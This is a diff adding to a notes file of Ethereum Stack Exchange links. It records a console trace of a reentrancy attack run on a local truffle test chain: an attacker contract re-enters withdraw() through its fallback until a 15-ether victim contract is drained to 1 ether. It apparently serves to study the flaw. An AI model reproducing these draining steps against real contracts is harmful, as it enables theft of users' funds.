@@ -72,5 +72,36 @@ https://ethereum.stackexchange.com/questions/7069/whats-the-point-of-sending-a-v
 https://ethereum.stackexchange.com/questions/26838/how-to-get-the-creator-of-a-contract-was-the-owner
 https://ethereum.stackexchange.com/questions/11484/how-can-contract-ownership-be-transferred-from-one-account-to-another
 
+TRACE
+Reentrant has 15
+truffle(develop)> Reentrant.deployed().then(instance => instance.deposit({from: web3.eth.accounts[1], value: web3.toWei(15, "ether") }))
 
+truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)
+'15000000000000000000'
+truffle(develop)>  web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
+'0'
+truffle(develop)>  Reentrant.deployed().then(instance => instance.getWithdrawCount())
+BigNumber { s: 1, e: 0, c: [ 0 ] }
+
+ReentrantAttacker attacks with 2
+ReentrantAttacker.deployed().then(inst => inst.attack({ value: web3.toWei(2, "ether") }))
+
+ReentrantAttacker             Reentrant      15 Ethers
+                       -2     deposit()  +2  17        
+                       +2     withdraw() -2  15
+fallback() 15>=2       +2     withdraw() -2  13
+fallback() 13>=2       +2     withdraw() -2  11
+fallback() 11>=2       +2     withdraw() -2  9
+fallback() 9>=2        +2     withdraw() -2  7
+fallback() 7>=2        +2     withdraw() -2  5
+fallback() 5>=2        +2     withdraw() -2  3
+fallback() 3>=2        +2     withdraw() -2  1
+fallback() 1 ! (>=2)
+
+truffle(develop)> Reentrant.deployed().then(instance => instance.getWithdrawCount())
+BigNumber { s: 1, e: 0, c: [ 8 ] }
+truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
+'16000000000000000000'
+truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)
+'1000000000000000000'
 
